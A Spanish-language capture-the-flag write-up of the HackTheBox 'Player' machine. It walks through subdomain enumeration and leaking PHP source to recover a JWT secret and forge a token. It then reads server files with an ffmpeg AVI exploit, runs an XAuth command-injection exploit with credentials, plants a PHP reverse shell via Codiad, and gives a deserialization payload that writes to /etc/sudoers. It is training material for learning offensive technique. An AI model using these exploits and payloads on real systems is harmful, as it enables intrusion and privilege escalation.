-------
- Tags: #restricted-shell #jwt #subdomain #no-redirect #avi #XAuth #Codiad #serialize
- ---------
## Técnicas utilizadas
- Subdomain Enumeration  
- JWT Enumeration  
- Information Leakage - Abusing No Redirect  
- Playing with BFAC (Backup File Artifacts Checker) in order to find a configuration file  
- PHP Source Code Analysis  
- Forge JWT  
- Abusing ffmpeg AVI Exploit in order to read internal files  
- Escaping Limited Shell - OpenSSH 7.2p1 (Authenticated) XAuth Command Injection  
- Abusing Codiad IDE in order to execute commands (RCE - www-data)  
- Abusing Cron Job (Privilege Escalation)
## Procedimiento

![[Pasted image 20230814060351.png]]

#### Reconocimiento
Si lanzamos un **nmap** a la maquina victima, podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80,6686 10.10.10.145 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 15:53 UTC
Nmap scan report for 10.10.10.145
Host is up (0.074s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d730dbb9a04c79947838b343a2505581 (DSA)
|   2048 372be431eea6490d9fe7e601e63e0a66 (RSA)
|   256 0c6c05edadf175e802e4d2273e3a198f (ECDSA)
|_  256 11b8dbf3cc29084a49cebf917340a280 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
```

Un escaneo con **whatweb** nos muestra las siguientes tecnologías corriendo por detras:
```ruby
# whatweb 10.10.10.145
http://10.10.10.145 [403 Forbidden] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], Title[403 Forbidden]
```

#### Subdomain Enumeration  
Si visitamos la pagina principal vemos que nos encontramos con un **403 Not Found**. Haciendo un poco de fuzzing con **Gobuster** damos con la ruta de **Launcher**:
![[Pasted image 20230814162927.png]]

Al visitarla, solo encontramos un formulario para mandar un correo el cual parece no estas operativo. Podemos intentar enumerar por subdominios, considerando que la maquina se llama **Player**, contemplamos el siguiente nombre en el **/etc/hosts**: `player.htb`.
Le tiramos un **Gobuster** para ver si podemos encontrar subdominios validos:
![[Pasted image 20230814163116.png]]

Encontramos tres, los vamos a meter en el **/etc/hosts** para poder inspeccionarlos.

------------
#### JWT Enumeration  
Al mirar las cookies que tenemos en el sitio web principal, nos podemos dar cuenta de que tiene la tipica estructura de un **Json Web Token**:
![[Pasted image 20230814163528.png]]

Vamos a usar [JWT.io](https://jwt.io/) para desencryptar la cookie y ver cuales son sus valores, esto nos puede servir más adelante si llegamos a obtener el **Secreto** dado que podriamos crear una nueva **Cookie** y firmarla:
![[Pasted image 20230814163648.png]]

#### Information Leakage - Abusing No Redirect 
En el dominio de nombre `http://staging.player.htb/`  encontramos un formulario de contacto, al intentar enviarlo, vemos como se leakea una información pero rapidamente nos redirecciona a un custom **501.php**. Con **Burpsuite** vamos a interceptar la petición y leer el output antes de que nos redireccione:
![[Pasted image 20230814164613.png]]

#### Playing with BFAC (Backup File Artifacts Checker) in order to find a configuration file 
Vemos en el anterior array que se esta haciendo uso de backup en archivos de configuración. Sabiendo esto, podemos usar el siguiente [recurso](https://www.rapid7.com/db/vulnerabilities/http-php-temporary-file-source-disclosure/) para intentar leer el codigo fuente de un PHP. Si nos fijamos bien, en la pagina principal cuando mandamos un correo nos redirige a un archivo con una extension **.php?**:
![[Pasted image 20230814170814.png]]

-----------------
#### PHP Source Code Analysis  
Si con **Burpsuite** interceptamos la petición y cambiamos el **?** por un **~** tal y como lo indican en el articulo, podremos leer el codigo fuente y encontrar la **Secret** para forjar un nuevo **Json Web Token**:
```php
<?php
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))
{
	$key = '_S0_R@nd0m_P@ss_';
	$decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
	if($decoded->access_code === "0E76658526655756207688271159624026011393")
	{
		header("Location: 7F2xxxxxxxxxxxxx/");
	}
	else
	{
		header("Location: index.html");
	}
}
else
{
	$token_payload = [
	  'project' => 'PlayBuff',
	  'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
	];
	$key = '_S0_R@nd0m_P@ss_';
	$jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
	$cookiename = 'access';
	setcookie('access',$jwt, time() + (86400 * 30), "/");
	header("Location: index.html");
}
?>
```


#### Forge JWT  
Con el **Secret** vamos a crear un token nuevo que cumpla con las espeficiaciones requeridas:
![[Pasted image 20230814172937.png]]

Como resultado, nos da el siguiente **JWT** `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE`
el cual colocaremos como nuevo en las cookies:
![[Pasted image 20230814173024.png]]

Ahora, al volver a visitar `launcher/dee8dc8a47256c64630d803a4c40786c.php?` vemos que nos redirecciona a `launcher/7F2dcsSdZo6nj3SNMTQ1/`  

#### Abusing ffmpeg AVI Exploit in order to read internal files
Vemos que se trata de un sitio donde podemos subir archivos con formato **.avi** los cuales corresponden a formatos de video. Buscando por algunas vulnerabilidades en google, encontramos el siguiente [exploit](https://github.com/neex/ffmpeg-avi-m3u-xbin) el cual nos permite leer archivos de forma remota en el servidor:
```
# python3 gen_xbin_avi.py file://etc/passwd passwd.avi
```

Lo subimos, los descargamos y en el video, podemos ver el **/etc/passwd**:

![[Pasted image 20230814174217.png]]

Si listamos el archivo que vimos anteriormente (el array en **PHP**) que contiene configuraciones, podemos ver las siguientes credenciales:
![[Pasted image 20230814184453.png]]

Estas, nos sirven para conectarnos por **SSH** en el puerto **6686**

#### Escaping Limited Shell - OpenSSH 7.2p1 (Authenticated) XAuth Command Injection 
Al intentar ejecutar comandos, veremos que no tenemos la capacidad dado que nos encontramos en una **Shell** restringida;
![[Pasted image 20230814193452.png]]

Dado que la versión que esta en uso, parece un poco antigua, podemos buscar por exploits para esta. Encontramos [uno](https://www.exploit-db.com/exploits/39569) que inyecta comandos a través de **XAuth**, solo tenemos que ejecutar el siguiente comando:
```
# rlwrap python2 39569.py 10.10.10.145 6686 telegen 'd-bC|jC!2uepS/w'
```

Dentro, tenemos algunos comandos que se nos indican al instante de iniciar sesión:
```
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>
```

Podemos aprovecharnos de esto para intentar leer el archivo **FIx.php** que desde el **.avi** no habiamos podido leer. El archivo contiene credenciales para **Peter**:
![[Pasted image 20230814193837.png]]

Estas credenciales nos sirven para conectarnos al sitio **dev.player.htb**.

#### Abusing Codiad IDE in order to execute commands (RCE - www-data)  
Dentro de la web, nos damos cuenta de que es un **Codiad** el cual sirve como un **IDE** para escibir codigo. Tenemos la capacidad de crear un proyecto. Vamos aprovecharnos de esto para crear uno con un **Reverse Shell**:
![[Pasted image 20230814194052.png]]

Al intentar crearlo, nos dan la ruta a la que tenemos permisos de escritura. Creamos un nuevo proyecto y subimos un tipico **Reverse Shell** desde php:
![[Pasted image 20230814194152.png]]

Ahora solo bastaria con visitar `http://dev.player.htb/home/rev.php` y ganariamos una shell.

#### Abusing Cron Job (Privilege Escalation)
Si lanzamos un **Pspy** en la maquina, vemos que **Root** esta ejecuta un archivo **.php** cada cierto tiempo:
![[Pasted image 20230814195921.png]]

Al hacerle un **cat** vemos que se trata un script en **.php** el cual serializada data proviniente de **/var/lib/playbuff/merge.log**. Podemos abusar de esto, dado que se nos comparte como el script serializada la data:
```php
<?php
class playBuff {
    public $logFile = "/var/lib/playbuff/../../../../../../../../etc/sudoers";
    public $logData = "telegen ALL=(ALL)ALL";
}
$buff = new playBuff();   
$serialBuff = base64_encode(serialize($buff));
print $serialBuff;
?>
```

Al intentar escribir el merge.log nos encontramos con el inconveniente de que no tenemos permisos de escritura, sin embargo, telegen si y tenemos su contraseña. Podemos aplicar este pequeño **bypass** para omitir la **restricted shell**:
```
# su -s /bin/bash -c '/bin/bash' telegen
```

Una vez como telegen, metemos nuestra data serializada al **merge.log** esperamos a que se ejecute la tarea y ya podriamos ejecutar cualquier comando como el usuario **telegen.**